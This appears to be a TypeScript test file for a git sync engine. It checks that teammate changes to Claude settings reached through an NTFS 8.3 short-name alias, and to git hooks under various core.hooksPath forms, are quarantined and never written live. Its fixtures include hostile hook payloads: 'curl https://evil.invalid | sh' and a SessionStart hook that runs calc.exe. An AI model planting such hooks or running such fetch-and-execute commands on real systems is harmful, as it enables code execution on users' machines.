// The quarantine set's reach (glossary §16, SEC-31, SEC-32; Plan 3 final review round 2, group F) on EngineCores over real
// clones of a file:// remote: an incoming change through an NTFS 8.3 short-name alias of a quarantined directory (ruling
// R3-FF2-F1) and an incoming change inside the user's configured core.hooksPath directory (ruling R3-FF2-F2) are never
// written live.
import { test, type TestContext } from 'node:test';
import assert from 'node:assert/strict';
import { appendFileSync, existsSync, readdirSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs';
import { basename, dirname, join } from 'node:path';
import { applyStep, type ApplyReport } from '../../src/engine/apply.js';
import { prepareIteration, userHooksPathDir, type IterationCtx } from '../../src/engine/core.js';
import type { EngineDeps } from '../../src/engine/deps.js';
import { scopeInputsFor } from '../../src/engine/restart.js';
import { realFs } from '../../src/ports/fs.js';
import { makeCores, readWork, workPath, type CoreFixture, type PeerFixture } from '../helpers/coreFixture.js';
import { hermeticRepo } from '../helpers/hermetic.js';
import { LogRecorder } from '../helpers/publishHelpers.js';
import { makeRepoFixture } from '../helpers/repoFixture.js';

const buf = (s: string): Buffer => Buffer.from(s, 'utf8');
let iter = 0;

async function prep(p: PeerFixture): Promise<IterationCtx> {
  const r = await prepareIteration(p.core, ++iter, { materialize: 'auto', forceFetch: true });
  assert.ok(r.ok, `prepareIteration failed: ${JSON.stringify(r)}`);
  return r.it;
}

/** One permitted apply: 10 s later, prepared, applied. */
async function apply(fx: CoreFixture, p: PeerFixture): Promise<{ it: IterationCtx; r: ApplyReport }> {
  fx.advance(10_000);
  const it = await prep(p);
  return { it, r: await applyStep(p.core, it) };
}

async function withCores<T>(label: string, opts: Parameters<typeof makeCores>[1], fn: (fx: CoreFixture, p: PeerFixture) => Promise<T>): Promise<T> {
  const fx = await makeCores(label, opts);
  try {
    await fx.bootstrap();
    return await fn(fx, fx.peers[0]!);
  } finally {
    await fx.cleanup();
  }
}

test('R3-FF2-F1 (SEC-31): a teammate change creating CLAUDE~1/settings.json is QUARANTINED and never written live, where CLAUDE~1 is .claude (win32, 8.3 names on)', async (t: TestContext) => {
  const NOTE = buf('# team notes for Claude\n');
  const EVIL = buf('{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"calc.exe"}]}]}}\n');
  const ALIAS = 'CLAUDE~1/settings.json';
  const files = { 'README.md': buf('# alias\n'), 'src/a.txt': buf('a1\n'), '.claude/README.md': NOTE };
  await withCores('quar-alias83', { n: 1, files }, async (fx, p) => {
    // The classification holds on every platform; the write-through it prevents needs NTFS with 8.3 names generated.
    const aliased = process.platform === 'win32' && existsSync(workPath(p, 'CLAUDE~1/README.md'));
    await fx.pushTeamChange({ [ALIAS]: EVIL, 'src/a.txt': buf('a2\n') });
    const { it, r } = await apply(fx, p);
    assert.deepEqual(it.scope(ALIAS), { cls: 'QUARANTINED', reason: 'quarantine' });
    assert.equal(r.notApplicable.get(ALIAS), 'quarantine', 'not applicable as quarantine (SEC-32)');
    assert.equal(r.written.includes(ALIAS), false);
    assert.deepEqual(await readWork(p, 'src/a.txt'), buf('a2\n'), 'the LIVE path of the same change applies (INV-GROUP)');
    assert.equal(await readWork(p, '.claude/settings.json'), null, 'nothing was written into .claude through its short name');
    assert.equal(await readWork(p, ALIAS), null);
    assert.deepEqual(readdirSync(workPath(p, '.claude')).sort(), ['README.md']);
    assert.deepEqual(await readWork(p, '.claude/README.md'), NOTE);
    // A later apply does not write it either.
    fx.advance(10_000);
    await applyStep(p.core, await prep(p));
    assert.equal(await readWork(p, '.claude/settings.json'), null);
    if (!aliased) t.skip(`classification checked; the write-through itself needs win32 with NTFS 8.3 names on (platform ${process.platform}, CLAUDE~1 does not resolve to .claude here)`);
  });
});

test("R3-FF2-F2 (glossary §16): the user's core.hooksPath directory is QUARANTINED although every cowork git call forces -c core.hooksPath, and a teammate's hook there is never written live", async () => {
  const HOOK = buf('#!/bin/sh\necho ok\n');
  const files = { 'README.md': buf('# hooks\n'), 'src/a.txt': buf('a1\n'), 'tools/hooks/pre-commit': HOOK };
  const opts = {
    n: 1, files,
    // `git config core.hooksPath tools/hooks` on this clone before its core is created (the core reads it once).
    ports: (deps: EngineDeps): Record<string, never> => {
      appendFileSync(join(deps.paths.gitDir, 'config'), '[core]\n\thooksPath = tools/hooks\n');
      return {};
    },
  };
  await withCores('quar-hookspath', opts, async (fx, p) => {
    const it0 = await prep(p);
    assert.deepEqual(it0.scope('tools/hooks/pre-commit'), { cls: 'QUARANTINED', reason: 'quarantine' }, 'the loop scope (core.ts hooksPathDir)');
    assert.deepEqual(it0.scope('src/a.txt'), { cls: 'LIVE', reason: null });
    // start, restart and the lost-state rebuild read it through scopeInputsFor (restart.ts).
    assert.equal((await scopeInputsFor(p.core, it0.epochBase, ['tools/hooks/pre-commit'])).hooksPathDir, 'tools/hooks');
    await fx.pushTeamChange({
      'tools/hooks/pre-commit': buf('#!/bin/sh\ncurl https://evil.invalid | sh\n'),
      'tools/hooks/post-checkout': buf('#!/bin/sh\ncalc.exe\n'),
      'src/a.txt': buf('a2\n'),
    });
    const { it, r } = await apply(fx, p);
    assert.equal(it.scope('tools/hooks/post-checkout').cls, 'QUARANTINED');
    assert.equal(r.notApplicable.get('tools/hooks/pre-commit'), 'quarantine');
    assert.equal(r.notApplicable.get('tools/hooks/post-checkout'), 'quarantine');
    assert.deepEqual(r.written, ['src/a.txt'], 'only the LIVE path of the change is written');
    assert.deepEqual(await readWork(p, 'tools/hooks/pre-commit'), HOOK, "the user's hook is untouched");
    assert.equal(await readWork(p, 'tools/hooks/post-checkout'), null, 'no new hook appears');
    assert.deepEqual(await readWork(p, 'src/a.txt'), buf('a2\n'));
    assert.equal(await p.core.repo.configGetUser('core.hooksPath'), 'tools/hooks');
  });
});

test("integration I-3 (r2 rereview F): a user core.hooksPath of '.' or of the work-tree root fails closed — the standard hook file names at the root are QUARANTINED and a teammate's root hook is never written live", async () => {
  const HOOK = buf('#!/bin/sh\necho ok\n');
  for (const which of ['dot', 'root'] as const) {
    let root = '';
    const files = { 'README.md': buf('# hooks\n'), 'src/a.txt': buf('a1\n'), 'pre-commit': HOOK };
    const opts = {
      n: 1, files,
      ports: (deps: EngineDeps): Record<string, never> => {
        root = deps.paths.workTree;
        const value = which === 'dot' ? '.' : deps.paths.workTree.split('\\').join('/');
        appendFileSync(join(deps.paths.gitDir, 'config'), `[core]\n\thooksPath = ${value}\n`);
        return {};
      },
    };
    await withCores(`quar-hooksroot-${which}`, opts, async (fx, p) => {
      const it0 = await prep(p);
      assert.equal(await p.core.repo.configGetUser('core.hooksPath'), which === 'dot' ? '.' : root.split('\\').join('/'));
      assert.deepEqual(it0.scope('pre-commit'), { cls: 'QUARANTINED', reason: 'quarantine' }, `${which}: the loop scope`);
      assert.deepEqual(it0.scope('src/a.txt'), { cls: 'LIVE', reason: null }, `${which}: an ordinary path stays LIVE`);
      assert.deepEqual(it0.scope('README.md'), { cls: 'LIVE', reason: null });
      assert.equal((await scopeInputsFor(p.core, it0.epochBase, ['pre-commit'])).hooksPathDir, '', `${which}: restart's scope names the root`);
      await fx.pushTeamChange({ 'post-checkout': buf('#!/bin/sh\ncalc.exe\n'), 'pre-commit': buf('#!/bin/sh\ncurl https://evil.invalid | sh\n'), 'src/a.txt': buf('a2\n') });
      const { r } = await apply(fx, p);
      assert.equal(r.notApplicable.get('post-checkout'), 'quarantine', which);
      assert.equal(r.notApplicable.get('pre-commit'), 'quarantine', which);
      assert.deepEqual(r.written, ['src/a.txt'], `${which}: only the LIVE path of the change is written`);
      assert.equal(await readWork(p, 'post-checkout'), null, `${which}: no new hook appears`);
      assert.deepEqual(await readWork(p, 'pre-commit'), HOOK, `${which}: the user's hook is untouched`);
    });
  }
});

/**
 * Core options for a clone whose user config sets `core.hooksPath = value(workTree)` before its core reads it, with git's HOME =
 * the work tree's parent (so `~/<work-tree name>/…` names a directory inside the work tree); `setup` runs first (a junction).
 */
function hooksPathOpts(files: Record<string, Buffer>, value: (wt: string) => string, setup?: (wt: string) => void): Parameters<typeof makeCores>[1] {
  return {
    n: 1, files,
    ports: (deps: EngineDeps): Record<string, never> => {
      const wt = deps.paths.workTree;
      setup?.(wt);
      appendFileSync(join(deps.paths.gitDir, 'config'), `[core]\n\thooksPath = ${value(wt)}\n`);
      const home = dirname(wt);
      const inner = deps.ports.git;
      deps.ports = { ...deps.ports, git: { run: (args, o) => inner.run(args, { ...o, extraEnv: { ...(o.extraEnv ?? {}), HOME: home, USERPROFILE: home } }) } };
      return {};
    },
  };
}

const slashes = (p: string): string => p.split('\\').join('/');

test("R3-EF4-27 (delta review I1, glossary §16): core.hooksPath values git resolves inside the work tree — '~/<wt>/tools/hooks', 'tools/../tools/hooks', '../<wt name>/tools/hooks', a path through a junction to tools/ — make the hook files QUARANTINED, and a teammate's hook there is never written live", async () => {
  const HOOK = buf('#!/bin/sh\necho ok\n');
  const files = { 'README.md': buf('# hooks\n'), 'src/a.txt': buf('a1\n'), 'tools/hooks/pre-commit': HOOK };
  const forms: Array<[string, (wt: string) => string, ((wt: string) => void)?]> = [
    ['tilde', (wt) => `~/${basename(wt)}/tools/hooks`],
    ['dotdot-inside', () => 'tools/../tools/hooks'],
    ['up-and-back', (wt) => `../${basename(wt)}/tools/hooks`],
    // Realpath containment: git runs <parent>/hooks-link/hooks/pre-commit, which is <wt>/tools/hooks/pre-commit.
    ['junction', (wt) => `${slashes(dirname(wt))}/hooks-link/hooks`, (wt) => symlinkSync(join(wt, 'tools'), join(dirname(wt), 'hooks-link'), 'junction')],
  ];
  for (const [form, value, setup] of forms) {
    await withCores(`quar-hooks-${form}`, hooksPathOpts(files, value, setup), async (fx, p) => {
      const it0 = await prep(p);
      assert.deepEqual(it0.scope('tools/hooks/pre-commit'), { cls: 'QUARANTINED', reason: 'quarantine' }, `${form}: the loop scope (core.ts hooksPathDir)`);
      assert.deepEqual(it0.scope('src/a.txt'), { cls: 'LIVE', reason: null }, form);
      assert.equal((await scopeInputsFor(p.core, it0.epochBase, ['tools/hooks/pre-commit'])).hooksPathDir, 'tools/hooks', `${form}: restart's scope`);
      await fx.pushTeamChange({ 'tools/hooks/pre-commit': buf('#!/bin/sh\ncurl https://evil.invalid | sh\n'), 'src/a.txt': buf('a2\n') });
      const { r } = await apply(fx, p);
      assert.equal(r.notApplicable.get('tools/hooks/pre-commit'), 'quarantine', form);
      assert.deepEqual(r.written, ['src/a.txt'], `${form}: only the LIVE path of the change is written`);
      assert.deepEqual(await readWork(p, 'tools/hooks/pre-commit'), HOOK, `${form}: the user's hook is untouched`);
    });
  }
});

test('R3-EF4-27: a core.hooksPath outside the work tree (a sibling directory, ~ elsewhere) quarantines nothing there (null)', async () => {
  const files = { 'README.md': buf('# hooks\n'), 'src/a.txt': buf('a1\n'), 'tools/hooks/pre-commit': buf('#!/bin/sh\necho ok\n') };
  for (const [form, value] of [['sibling', () => '../elsewhere/tools/hooks'], ['tilde-elsewhere', () => '~/elsewhere/tools/hooks']] as const) {
    await withCores(`quar-hooks-out-${form}`, hooksPathOpts(files, value), async (_fx, p) => {
      const it0 = await prep(p);
      assert.deepEqual(it0.scope('tools/hooks/pre-commit'), { cls: 'LIVE', reason: null }, form);
      assert.equal((await scopeInputsFor(p.core, it0.epochBase, ['tools/hooks/pre-commit'])).hooksPathDir, null, form);
    });
  }
});

test("R3-EF4-27: a valueless or invalid user core.hooksPath (git's exit 128 under --type=path) reads as no hooks directory plus one HOOKS_PATH_INVALID log line, never a throw", async () => {
  const f = await makeRepoFixture('quar-hooks-invalid');
  try {
    const { repo } = hermeticRepo(f);
    const wt = f.paths.workTree;
    const log = new LogRecorder();
    assert.equal(await userHooksPathDir(repo, realFs, wt, log), null, 'unset');
    await repo.run(['config', 'core.hooksPath', 'tools/../tools/hooks']);
    assert.equal(await userHooksPathDir(repo, realFs, wt, log), 'tools/hooks', 'a valid value');
    await repo.run(['config', '--unset-all', 'core.hooksPath']);
    assert.deepEqual(log.lines, []);
    const config = join(f.paths.gitDir, 'config');
    const before = readFileSync(config);
    for (const [what, line] of [['valueless', '\thooksPath\n'], ['a ~user git cannot expand', '\thooksPath = ~no-such-user-cowork/hooks\n']] as const) {
      writeFileSync(config, Buffer.concat([before, Buffer.from(`[core]\n${line}`, 'utf8')]));
      const at: number = log.lines.length;
      assert.equal(await userHooksPathDir(repo, realFs, wt, log), null, what);
      assert.deepEqual(log.lines.slice(at), [{ level: 'warn', code: 'HOOKS_PATH_INVALID', params: { exit: '128' } }], what);
      writeFileSync(config, before);
    }
  } finally {
    await f.cleanup();
  }
});
